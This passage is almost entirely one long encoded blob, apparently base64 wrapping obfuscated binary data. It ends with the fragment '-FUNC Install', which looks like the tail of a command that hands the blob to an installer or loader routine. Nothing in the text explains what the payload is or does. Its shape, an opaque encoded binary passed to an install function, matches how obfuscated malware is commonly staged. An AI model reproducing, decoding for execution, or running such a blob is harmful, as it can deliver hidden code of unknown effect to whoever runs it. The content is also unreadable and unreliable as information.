lkyWdJaYleiOQIdcvDy7bLUwsvSyeK8sp9ikbKAYoVSgXxxcXsxcXF3knnSe9J68nqCfSJ/0nEiYEJggmPCYoJkImbCawJrgm8CboJhglNiUxJTwlRSVMJXclciWeJYIljSWIJdQl2CXDJc4lFyQbJAYkASRRJFkkRCR0JHokhSSzJKckrSTbJMYk4iQWIwkiMiJLInIi1SLZIlEhdCF4IfMh4CECIDQgxi8fLhguAy4PLgsuNy5hLqwu1y7TLt8u2y4nKxf3FxdfFxcXUCdYJ0AnQiZwJq4lVSRRJF0kWSRFJEEkTSRJJFUvSS91L3EvfS95L2UvYS9tL2kvlS+RL50vyy8LKiEqoyoXFxfnFxeTFxcXOyN3ImEijSLKIv0i7iIZITUhICEpIV0hdSFwIWQhbyGbIUQgTSB7IGIgqiDYIMAg9iD9IOwgGi8/L0Mvii+wL7svpS8zLjoucS5mLkgshiyPLKAr2CvrKwAqMCo7KiEqLCpRKkYqciqhKh0pCilVKc8p+Cl6KJgo+yjgKBcXFheDFxcXXieGJ/An7idWJlImWiZOJmUmkiapJsIm9yb/JuQm7iYTJR0lDyUhJVglQyWXJYYlgSWqJeYlDyQlJGskniSyJN4k8yT4JDEjVCO2I5gigiKwIvIi/CJlIWoh9yHxIVEgIy8pL1wvaS+cL6wvzy/0LwQuIS4qLpUujC44LHIsgizfLMwsISmeKbsoFxcXBxYXYxcXF0QmjCbbJusmUCW7JdUlSCQrI1QjfCOSI4sjtCPXI/Aj6yMbIg4iIyJXIlwifiKHIrIioiLVIvwi4yIGIQkhUiFNIX0hYCGGIY8htSHTIcIh/SHjIQAgNiASK8opCyg0KDkoLihTKHgobiiUKBc3FhfrFxcXSiZgJpEmgya3JrsmrSbdJsgm4SYOJSMlViVYJUolfyVpJYUljSWyJacl3iXZJcAlAyREJJwkqiTPJAMjXCNKI4YjoyMZIgkiIyIuIikiWSJEIk8iaiKPIrEipSKpIsUi/yIZISshUyFrIYMhsyGvIdQh3yHaIf0hGCANIAggMyAoIF4gciBnIGIgbSCCIIggrCDRINwgxyD8IOIgBi8LLzYvMS9TL1kvfS9iL20vaC+NL7Mv1y/cL8cvwi/hLxEuNS5BLm0ugS6iLs8uyi76LuAuNy0lLSktby1RLEgsmyyELIksuyykLK4swyzMLNopeCiBKBcnFhfXFxcXFycwJ8EnOCZZJmYmqybUJt0mxib8Ju0mEyUGJQwlPCWUJawlwSX/IwIiQiJ2ImQioCLkIusiFyERIR0hByEDIQkhJiEtIUIhmCGqIdgh9SFhIL0g2SABL64vqS/TL94vBS4iLkwuai4TLRwtAi0zLV8tay2wLdAt/C0eLAMsfixnLGAsaSycLMks9Cz/LPos6CyoKyAqVypPKn0qgCqoKuQq7CoEKTcpOykjKVspcinxKRcoEigXFxdXFhcnFxcXyic0JmAm9ybXJZIkvSTgJFMjCyKSIrgiySJTIWohhCGjITsguStEKhdHFhczFxcX3SPFIx4iByImLzEuOS5yLnsueyu8KKwo1SjeKBd3FheDFxcXjietJ9YnwCf6J+0n6CcaJoMmvyb3JuUmEyUBJT8lLSVbJUklZyWVJYMlsSWvJc4l/CXqJRgkNiRBI4AjGyIJIv4iFCEoIVkhSyFuIZYhvSGmIdohwyH8IRYgKyBUIIQgsCARL2kvvC8bLtEuni2hLfQtLSx6LK0sTyuAKxgoAihjKG0okCitKNgo9ygXZxYXlxcXF1cnQSezJ9cnyCcEJr0m3SYTJTwlISVRJaol4yUEJD4kJCRFJGckyCQfIyYjWCPaI+EjCCIsItMi5SI0ISghZSGYIbkhOiCdICIvti+8L+EvBS1qLYAtsy3DLe8tFCwHLDUsfSyULBArCysyKzkrbyuVK7srWCrRKheXFheHFxcXviZKJRQkEiMtIxwiByJOInYifiJmIm4igCKIIhYhGiE2ITohLiFOIbch3SHFIfgh6CEcIA0gCS9YL4Yv3y/yL+4vEy5GLs4uVy3iLX4skSyBLPws+yvrKxoqAioyKiEqiyqwKqUqryrWKhQpOSlEKUgpfClpKYop3yn3KTIoJigqKF4oSyiXKBeHFhdPFxcXFydwJ40nBSY/Jocm2ibAJuUm1yXRJdwlxSX1JeclFiQOJAgkPCRdJEckuySpJMckVyO2I+sjfSKeIq0iGCBeL3MvbS+HL48v6SwWKgUqjygXtxYXPxcXF7EnvCeqJ8wn+CfiJ9gmFCUtJTYjKSPlIxki8SKwLBcXF6cWF2cXFxcAKwwrCCs0KzArPCs4KyQrICssKygrVCtQK1wrWCtEK0ArTCtIK3QrcCt8K3grZCtgK2wraCuUK5ArnCuYK4Qr6itIKpUqsir0KgcpKilnKYopxynnKRwoASg2KDsoIigsKFYoUShBKBfXFhdfFxcXkyWbJYcliyW3JbMlpyWjJa8lxyXDJcsl9yXzJeslFyQTJA8kCyQ3JCskVyS3JLskryTTJMckyyT/JOMkFyMbIxf3Fhc7FxcXxynDKc8pyyn3KfMp/yn7Kecp4ynvKQsoNygzKC8oKyhXKBcXF+cWF6cWFxd3J3Mnfyd7J2cnYydvJ2snlyeTJ58nmyeHJ4MnjyeLJ7cnsye/J7snpyejJ68nqyfXJ9Mn3yfbJ8cnwyfPJ8sn9yfzJ/8n+yfnJ+Mn7yfrJxcmEyYfJhsmByYDJg8mCyY3JjMmPyY7JicmIyYvJismVyZTJl8mWyZHJkMmTyZLJncmcyZ/JnsmZyZjJm8mayaXJpMmnyabJocmgyaPJosmtyazJr8muyanJqMmryarJtcm0ybfJtsmxybDJs8myyb3JvMm/yb7JucmDy43Lj8uOy4nLiMuLy4rLlcuUy5bLkcuQy5PLksudy5zLn8uYy5rLpMuny6bLocugy63KbMpvym7KacpoymvKasp1ynTKd8p2ynHKcMpzynLKfcp8yn/Kfsp5ynjKe8p6ykXKBMoHygbKAcoAygPKAsoNygzKD8oOygnKCMoLygrKFcoUyhfKEMoTyhLKHcocyh/KHsoZyhjKG8oayiXKJMonyibKIcogyiPKIsotyizKL8ouyinKKMoryirKNco0yjfKNsoxyjDKM8oyyj3KPMo/yj7KOco4yjvKOsoFxcVFysXFxcXJx8nGycHJwMnDycLJzcnMyc/JzsnJycjJy8nKydXJ1MnXydbJ0cnQyc3LDMsPyw7LBcXFwcVF8cWFxdDIksicyJ7ImMiayKTIpsigyKLIrMiuyKjIqsi0yLbIsMiyyLzIvsi4yLrIhMhGyEDIQshMyE7ISMhKyFTIVshQyFLIXMheyFjIWshkyGbIYMhiyGzIbshoyGrIdMh2yHDIcsh8yH7IeMh6yETIBsgAyALIDMgOyAjICsgUyBbIEMgSyBzIHsgYyBrIJMgmyCDIIsgsyC7IKMgqyDTINsgwyDLIPMg+yDjIOsgEy8bLwMvCy8zLzsvIy8rL1MvWy9DL0svcy97L2Mvay+TL5svgy+LL7Mvuy+jL6sv0y/bL8Mvyy/zL/sv4y/rLxMuGy4DLgsuMy47LiMuKy5TLlsuQy5LLnMuey5jLmsuky6bLoMuiy6zLrsuoy6rLtMu2y7DLssu8y77LuMu6y4TLRstAy0LLTMtOy0jLSstUy1bLUMtSy1zLXstYy1rLZMtmy2DLYstsy27LaMtqy3TLdstwy3LLfMt+y3jLestEywbLAMsCywzLDssIywrLFMsWyxDLEsscyx7LGMsayyTLJssgyyLLLMsuyyjLKss0yzbLMMsyyzzLPss4yzrLBMrGysDKwsrMys7KyMrKytTK1srQytLK3MreysXNxUXxxYXF2chbyGXIZ8hhyGPIbchvyGnIa8h1yHfIcchzyH3If8h5yHvIRcgHyAHIA8gNyA/ICcgLyBXIF8gRyBPIHcgfyBnIG8glyCfIIcgjyC3IL8gpyCvINcg3yDHIM8g9yD/IOcg7yAXLx8vBy8PLzcvPy8nLy8vVy9fL0cvTy93L38vZy9vL5cvny+HL48vty+/L6cvry/XL98vxy/PL/cv/y/nL+8vFy4fLgcuDy43Lj8uJy4vLlcuXy5HLk8udy5/Lmcuby6XLp8uhy6PLrcuvy6nLq8u1y7fLscuzy73Lv8u5y7vLhctHy0HLQ8tNy0/LSctLy1XLV8tRy1PLXctfy1nLW8tly2fLYctjy23Lb8tpy2vLdct3y3HLc8t9y3/Lect7y0XLB8sBywPLDcsPywnLC8sVyxfLEcsTyx3LH8sZyxvLJcsnyyHLI8styy/LKcsryzXLN8sxyzPLPcs/yznLO8sFysfKwcrDys3Kz8rJysvK1crXytHK08rdyt/K2crbyuXK58rhyuPK7crvyunK68r1yvfK8crzyv3K/8r5yvvKxcqHyoHKg8qNyo/KicqLypXKl8qRypPKncqfypnKm8qlyqfKhcnFRcHFxcXfSB5IGUgYSAXVxUXDxYXF5sngyeLJ7MnuyejJ6sn0yfbJ8MnyyfzJ/sn4yfrJxMmGyYDJgsmMyY7JiMmKyZTJlsmQyZLJnMmeyanJKMkryTXJNMk3yTbJMckwyTPJMsk9yTzJP8k+yTnJOMk+yDvIEMvTy9/L3svYy+bL4svty+nL6Mvry/XL88v/y/7L+svFy4TLh8uBy4/Li8uKy5bLkcuTy5nLpcuky6DLo8uiy6zLqsuayuTK4crpyurK8sr/ysfKgcqCyorKl8qfypjKoMqtyrXKtsq+yrvKg8pMylDKU8pbymPKaMprynXKd8pxynDKcsp5ynvKRsoAygLKDMoPyg7KCMoXyhzKH8okyifKL8opyijKMcozyjLKPsoF0cVF08XFxcHJwsnMydbJ0cnTyd3J38neydjJ58nsye/J98n/ycfJj8mUyZfJn8mnya/Jt8m/yYfJT8lXyV/JZ8lvyXfJf8lHyQ/JF8kfySfJL8k0yTfJBdnFRdPFxcXBycDJzMnPycrJz8mTyZ/Jm8mnyaPJqcmqybXJtMm9ybzJjcgMyA/IDsgJyAjIC8gKyBXIFMgRyBDIE8gSyB3IHMgfyB7IFcqSypvKrcqryoXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxcXFxc="  -FUNC Install
